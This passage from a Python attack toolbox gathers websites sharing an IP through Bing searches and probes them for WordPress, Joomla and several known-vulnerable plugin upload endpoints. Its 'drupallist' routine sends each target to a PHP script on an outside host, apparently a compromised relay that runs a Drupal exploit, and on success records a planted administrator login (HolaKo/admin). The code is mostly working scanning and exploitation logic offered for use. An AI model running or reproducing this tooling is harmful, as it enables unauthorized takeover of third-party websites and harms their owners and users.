                        a = open("up.txt", "a")
                        a.write(site + "\n")
                        a.close()
                    else:
                        print("[-] Exploit Not Found :(")
                except Exception as ex:
                    print(str(ex))
        except Exception as ex:
            print(str(ex))
            sys.exit(0)


def getdrupal():
    ip = input("Enter The IP: ").strip()
    page = 1
    sites = list()
    while page <= 50:
        url = "http://www.bing.com/search?q=ip%3A" + ip + "+node&first=" + str(page)
        try:
            req = urllib.request.Request(url)
            opreq = urllib.request.urlopen(req).read().decode("utf-8", errors="ignore")
            findurl = re.findall(r'<div class="b_title"><h2><a href="(.*?)" h=', opreq)
            page += 1
            for u in findurl:
                split = urlparse(u)
                site = split.netloc
                if site not in sites:
                    print(site)
                    sites.append(site)
        except Exception:
            page += 1


def drupallist():
    listop = input("Enter The list file: ").strip()
    with open(listop, "r") as fileopen:
        content = fileopen.readlines()
    for i in content:
        url = i.strip()
        try:
            openurl = urllib.request.urlopen(
                "http://crig-alda.ro/wp-admin/css/index2.php?url=" + url + "&submit=submit"
            )
            readcontent = openurl.read().decode("utf-8", errors="ignore")
            if "Success" in readcontent:
                print("[+] Success => " + url)
                print("[-] username:HolaKo\n[-] password:admin")
                with open("drupal.txt", "a") as save:
                    save.write(url + "\n[-]username:HolaKo\n[-]password:admin\n")
            else:
                print(i + "=> exploit not found")
        except Exception as ex:
            print(str(ex))


def maine():
    print(menuu)
    choose = input("Choose a number: ").strip()
    while True:
        if choose == "1":
            drupal()
        elif choose == "2":
            getdrupal()
        elif choose == "3":
            drupallist()
        elif choose == "99":
            menu()
        con = input("Continue [Y/n] -> ").strip()
        if con and con[0].upper() == "N":
            sys.exit()
        else:
            maine()


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + "wp-login.php").getcode() == 200:
                wp.append(site)
        except Exception:
            pass
    return wp


def check_joomla(sites):
    joomla = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + "administrator").getcode() == 200:
                joomla.append(site)
        except Exception:
            pass
    return joomla


def check_wpstorethemeremotefileupload(sites):
    result = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + "wp-content/themes/WPStore/upload/index.php").getcode() == 200:
                result.append(site)
        except Exception:
            pass
    return result


def check_wpcontactcreativeform(sites):
    result = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + "wp-content/plugins/sexy-contact-form/includes/fileupload/index.php").getcode() == 200:
                result.append(site)
        except Exception:
            pass
    return result


def check_wplazyseoplugin(sites):
    result = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + "wp-content/plugins/lazy-seo/lazyseo.php").getcode() == 200:
                result.append(site)
        except Exception:
            pass
    return result


def check_wpeasyupload(sites):
    result = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + "wp-content/plugins/easy-comment-uploads/upload-form.php").getcode() == 200:
                result.append(site)
        except Exception:
            pass
    return result


def check_wpsymposium(sites):
    result = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + "wp-symposium/server/file_upload_form.php").getcode() == 200:
                result.append(site)
        except Exception:
            pass
    return result


def wppjmla():
    ipp = input("Enter Target IP: ").strip()
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print(ss)
    print("[+] Found %d WordPress websites" % len(wordpress))
    print("-" * 30 + "\n")
    for ss in joomla:
        print(ss)
    print("[+] Found %d Joomla websites" % len(joomla))
    print()


def wpminiscanner():
    ip = input("Enter IP: ").strip()
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstoretheme = check_wpstorethemeremotefileupload(sites)
    wpcontact = check_wpcontactcreativeform(sites)
    wplazyse = check_wplazyseoplugin(sites)
    wpeasy = check_wpeasyupload(sites)
    wpsymp = check_wpsymposium(sites)
    for ss in wordpress:
        print(ss)
    print("[*] Found %d wordpress sites." % len(wordpress))
    print("-" * 30 + "\n")
    for ss in wpstoretheme:
        print(ss)
    print("[*] Found %d wp_storetheme exploit." % len(wpstoretheme))
    print("-" * 30 + "\n")
    for ss in wpcontact:
        print(ss)
    print("[*] Found %d wp_contactcreativeform exploit." % len(wpcontact))
    print("-" * 30 + "\n")
    for ss in wplazyse:
        print(ss)
    print("[*] Found %d wp_lazyseoplugin exploit." % len(wplazyse))
    print("-" * 30 + "\n")
    for ss in wpeasy:
        print(ss)
    print("[*] Found %d wp_easyupload exploit." % len(wpeasy))
    print("-" * 30 + "\n")
    for ss in wpsymp:
        print(ss)
    print("[*] Found %d wp_symposium exploit." % len(wpsymp))
    print()


class tnn:
    def __init__(self):
        clearScr()
        aaa = input("Target IP: ").strip()
        TNscan(aaa)


def grabsqli(ip):
    try:
        print("Check_Upload...")
        page = 1
        while page <= 21:
            bing = "http://www.bing.com/search?q=ip%3A" + ip + "+upload&count=50&first=" + str(page)
            try:
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read().decode("utf-8", errors="ignore")
                findwebs = re.findall(r'<h2><a href="(.*?)"', readbing)
                for i in findwebs:
                    try:
                        checksqli(i)
                    except urllib.error.HTTPError:
                        pass
            except Exception:
                pass
            page += 10
    except Exception:
        pass


def checksqli(sqli):
    try:
        responsetwo = urllib.request.urlopen(sqli).read().decode("utf-8", errors="ignore")
        find = re.findall(r'type="file"', responsetwo)
        if find:
            print("Found ==> " + sqli)
    except Exception:
        pass


def sqlscan():
    ip = input("Enter IP: ").strip()
    grabsqli(ip)


def update():
    print("""
|               OS                 |         Windows         |         Linux          |
| Dependencies                     | Git Clone               | Requests (for python)  |
| that you need to run our tool    | Ruby                    | Ruby                   |
| Install them before you continue | Perl                    |                        |
|                                  | Requests (for python)   |                        |
""")
    upc = input("Do you want to start the ToolBox? Y/N: ").strip()
    if upc in yes:
        menu()
    else:
        print("BYE!")
        sys.exit()


def begin():
    try:
        import requests
        update()
    except ImportError:
        os.system("pip3 install requests")
        update()


if __name__ == "__main__":
    begin()
